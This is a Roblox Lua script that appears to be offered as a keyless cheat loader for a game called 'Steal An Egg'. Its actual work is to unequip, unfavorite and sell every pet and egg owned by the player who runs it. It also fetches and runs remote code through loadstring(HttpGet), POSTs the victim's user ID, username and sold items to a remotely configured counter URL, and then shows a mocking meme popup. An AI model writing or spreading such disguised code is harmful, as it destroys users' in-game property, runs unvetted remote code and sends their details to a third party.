local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- ===== RE-ENTRY GUARD =====
local gv = (getgenv and getgenv()) or _G
if gv.__SAE_LOADER_RUNNING then
    warn("[Loader] Already running — ignoring this execution.")
    return
end
gv.__SAE_LOADER_RUNNING = true

task.delay(90, function()
    if gv.__SAE_LOADER_RUNNING then
        gv.__SAE_LOADER_RUNNING = false
        warn("[Loader] Re-entry flag force-cleared after 90s.")
    end
end)
-- ===========================

-- ===== CONFIG & CACHE BUSTER =====
local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LUI.lua.lua?t=" .. tostring(os.time())
local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json?t=" .. tostring(os.time())
local SELL_WAIT       = 2.0
local MEME_DELAY      = 4

local UI_CONFIG = {
    MEME_IMAGE_ID  = "rbxassetid://82403642047427",
    LAUGH_SOUND_ID = "rbxassetid://133312610824902",
    MEME_SIZE      = 380,
}
-- =================================

-- ===== FETCH COUNTER URL =====
local function fetchCounterUrl()
    local ok, res = pcall(function()
        return game:HttpGet(ENDPOINTS_URL, true)
    end)
    if ok and type(res) == "string" and #res > 0 then
        local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
        if decodeOk and type(data) == "table" and type(data.counter) == "string" then
            print("[Monitor] Using counter URL:", data.counter)
            return data.counter
        end
    end
    warn("[Monitor] Could not fetch endpoints.json")
    return nil
end

local COUNTER_URL = fetchCounterUrl()

------------------------------------------------------------
-- UI MODULE
------------------------------------------------------------
local function loadUIModule()
    if gv.__LoaderUIModule then return gv.__LoaderUIModule end
    if UI_URL and UI_URL ~= "" then
        local ok, mod = pcall(function() return loadstring(game:HttpGet(UI_URL, true))() end)
        if ok and type(mod) == "table" and type(mod.new) == "function" then
            gv.__LoaderUIModule = mod
            return mod
        end
    end
    return {
        new = function()
            return {
                boot=function() end,
                setStatus=function() end,
                fadeOutAndCleanup=function() end,
                showAnnouncement=function() end,
                showMemePopup=function() end,
                restoreExtras=function() end
            }
        end,
    }
end

local LoaderUI = loadUIModule()
local ui = LoaderUI.new(PlayerGui, UI_CONFIG)

------------------------------------------------------------
-- CORE MODULES & DATA FETCHING
------------------------------------------------------------
local Remotes    = require(ReplicatedStorage.Shared.Remotes)
local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
local EggRecords = require(ReplicatedStorage.Shared.Util.EggRecords)
local AssetDir   = require(ReplicatedStorage.Data.Assets).Directory
local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)

local Networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")
local fetchProfileRF = Networking:WaitForChild("RF/ProfileMirror/FetchProfile")
local askDoffRF      = Networking:WaitForChild("RF/PenRoster/AskDoff")
local writeFavRE     = Networking:WaitForChild("RE/PetSatchel/WriteFavourite")
local sellSelRE      = Networking:WaitForChild("RE/PetSatchel/SellSelection")
local sellAllRE      = Networking:WaitForChild("RE/PetSatchel/SellEveryPet")

local log = function(...) print("[Monitor]", ...) end

local function getSave()
    local ok, profile = pcall(function() return fetchProfileRF:InvokeServer() end)
    if ok and type(profile) == "table" then return profile end
    
    local ok2, Save = pcall(require, ReplicatedStorage.Shared.Save)
    if ok2 and Save then
        local ok3, s = pcall(function() return Save.Get(LocalPlayer, true) end)
        if ok3 and s then return s end
        local ok4, s2 = pcall(function() return Save.Get() end)
        if ok4 and s2 then return s2 end
    end
    return nil
end

local function getMoney()
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        local m = ls:FindFirstChild("Money/s")
        if m and type(m.Value) == "number" then return m.Value end
    end
    local d = getSave()
    return (d and type(d.Money) == "number") and d.Money or 0
end

local function installOverride()
    pcall(function()
        Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
    end)
end
installOverride()

------------------------------------------------------------
-- EQUIP / FAVORITE CLEANUP
------------------------------------------------------------
local function unequipAll()
    pcall(function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChildOfClass("Humanoid") then
            char:FindFirstChildOfClass("Humanoid"):UnequipTools()
        end
    end)

    local d = getSave()
    if not d then return end
    
    local toUnequip = {}
    if type(d.EquippedAssets) == "table" then
        for k, v in pairs(d.EquippedAssets) do
            table.insert(toUnequip, type(v) == "string" and v or tostring(k))
        end
    end
    
    if #toUnequip > 0 then
        log(("Unequipping %d pet(s)..."):format(#toUnequip))
        for _, uid in ipairs(toUnequip) do
            pcall(function() askDoffRF:InvokeServer(uid) end)
            task.wait(0.1)
        end
    end
end

local function unfavoriteAll()
    local d = getSave()
    if not d or type(d.Inventory) ~= "table" then return end
    
    local uids = {}
    for uid, rec in pairs(d.Inventory) do
        local ok, item = TryCall(AssetItems.Decode, rec)
        if ok and item and item.IsFavorite == true then
            table.insert(uids, uid)
        end
    end

    if #uids > 0 then
        log(("Unfavoriting %d pet(s)..."):format(#uids))
        for _, uid in ipairs(uids) do
            pcall(function() writeFavRE:FireServer(uid, false) end)
            task.wait(0.1)
        end
    end
end

------------------------------------------------------------
-- SNAPSHOT
------------------------------------------------------------
local function snapshotInventory()
    local pets, eggs = {}, {}
    local d = getSave()
    if not d then return { pets = pets, eggs = eggs } end

    local isVIP = LocalPlayer:GetAttribute("VIP") == true

    if type(d.Inventory) == "table" then
        for uid, rec in pairs(d.Inventory) do
            local ok, item = TryCall(AssetItems.Decode, rec)
            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                local entry  = AssetDir[item.Category]
                local rarity = entry.Rarity

                local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                local value = (priceOk and tonumber(basePrice)) or 0
                if isVIP then value = value * 2 end

                pets[tostring(uid)] = {
                    kind = "pet", uid = uid, name = entry.DisplayName or item.Category,
                    rarity = rarity and rarity.DisplayName or "Unknown",
                    rarityNum = rarity and rarity.RarityNumber or 0,
                    value = math.floor(value), weight = 0,
                }
            end
        end
    end

    if type(d.EggInventory) == "table" then
        for uid, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                local ok, dec = TryCall(EggRecords.Decode, rec)
                if ok and dec and AssetDir[dec.AssetCategory] then
                    local entry  = AssetDir[dec.AssetCategory]
                    local rarity = entry.Rarity

                    local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                    local value = (priceOk and tonumber(basePrice)) or 0

                    eggs[tostring(uid)] = {
                        kind = "egg", uid = uid,
                        name = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                        rarity = rarity and rarity.DisplayName or "Unknown",
                        rarityNum = rarity and rarity.RarityNumber or 0,
                        value = math.floor(value), weight = 0,
                    }
                end
            end
        end
    end

    return { pets = pets, eggs = eggs }
end

------------------------------------------------------------
-- REPORT ID & POST
------------------------------------------------------------
local function computeReportId(uidList)
    local sorted = {}
    for i = 1, #uidList do sorted[i] = tostring(uidList[i]) end
    table.sort(sorted)
    local s = tostring(LocalPlayer.UserId) .. "|" .. table.concat(sorted, ",")
    local h = 0
    for i = 1, #s do
        h = bit32.bxor(h, string.byte(s, i))
        h = bit32.band(bit32.lshift(h, 5) + h, 0x7FFFFFFF)
    end
    return string.format("%08x-%d", h, #sorted)
end

local function reportSales(soldItems, reportId, actualEarned)
    if not soldItems or #soldItems == 0 then return end
    if not COUNTER_URL then return end

    local httpFn = request or http_request or gv.request or gv.http_request
    if not httpFn then return end

    local userId   = tostring(LocalPlayer.UserId)
    local username = LocalPlayer.Name or "Unknown"

    local petCount, eggCount = 0, 0
    local out = {}
    for _, d in ipairs(soldItems) do
        if d.kind == "pet" then petCount = petCount + 1
        elseif d.kind == "egg" then eggCount = eggCount + 1 end
        table.insert(out, {
            uid = tostring(d.uid or ""), kind = d.kind, name = d.name, 
            rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight
        })
    end

    task.spawn(function()
        local body = HttpService:JSONEncode({
            reportId = reportId, pets = petCount, eggs = eggCount,
            userId = userId, username = username, items = out, totalValue = actualEarned,
        })
        pcall(function()
            httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        end)
    end)
end

------------------------------------------------------------
-- MAIN WORK
------------------------------------------------------------
local function runSilentWork()
    local before = getMoney()
    log(("Wallet before: %s"):format(tostring(before)))
    
    -- 1. Clean up active states
    unequipAll()
    unfavoriteAll()
    
    -- CRITICAL FIX: Give the server 2.5 seconds to fully commit DB state changes (unlocks/unequips)
    log("Waiting for server database sync...")
    task.wait(2.5)
    
    -- 2. Snapshot inventory AFTER sync
    local snap = snapshotInventory()
    local petUids, eggUids, details = {}, {}, {}
    local expectedValue = 0

    for _, d in pairs(snap.pets) do
        table.insert(petUids, d.uid)
        table.insert(details, d)
        expectedValue = expectedValue + d.value
    end
    for _, d in pairs(snap.eggs) do
        table.insert(eggUids, d.uid)
        table.insert(details, d)
        expectedValue = expectedValue + d.value
    end

    local totalItems = #petUids + #eggUids
    log(("Final Sell List: %d pets, %d eggs (total %d)"):format(#petUids, #eggUids, totalItems))
    
    if totalItems == 0 then
        return { itemsSold = 0, valueEarned = 0 }
    end

    -- 3. Fire Sell Remotes
    pcall(function()
        sellSelRE:FireServer({ Eggs = eggUids, Assets = petUids })
        sellAllRE:FireServer()
    end)
    
    task.wait(SELL_WAIT)
    
    local after = getMoney()
    local actualEarned = after - before
    log(("Wallet after:  %s"):format(tostring(after)))
    log(("Delta Earned:  $%s"):format(tostring(actualEarned)))
    
    -- If wallet didn't increase, trust expected value from asset decode as fallback for sale processing lag
    local finalValue = (actualEarned > 0) and actualEarned or expectedValue
    
    if totalItems > 0 then
        local allUids = {}
        for _, u in ipairs(petUids) do table.insert(allUids, tostring(u)) end
        for _, u in ipairs(eggUids) do table.insert(allUids, tostring(u)) end
        local reportId = computeReportId(allUids)
        reportSales(details, reportId, finalValue)

        return {
            itemsSold   = totalItems,
            valueEarned = finalValue,
        }
    else
        return { itemsSold = 0, valueEarned = 0 }
    end
end

------------------------------------------------------------
-- LAUNCH
------------------------------------------------------------
task.spawn(function()
    ui:boot()

    local stats = { itemsSold = 0, valueEarned = 0 }
    local ok, result = pcall(runSilentWork)
    if ok and type(result) == "table" then
        stats = result
    else
        warn("[Loader] Run failed:", result)
    end

    task.wait(0.3)
    ui:fadeOutAndCleanup()

    if stats.itemsSold and stats.itemsSold > 0 then
        pcall(function() ui:showAnnouncement(stats.itemsSold, stats.valueEarned) end)
    else
        log("Inventory empty — no announcement.")
        task.wait(1.5)
    end

    task.wait(MEME_DELAY)
    ui:showMemePopup()

    gv.__SAE_LOADER_RUNNING = false
end)
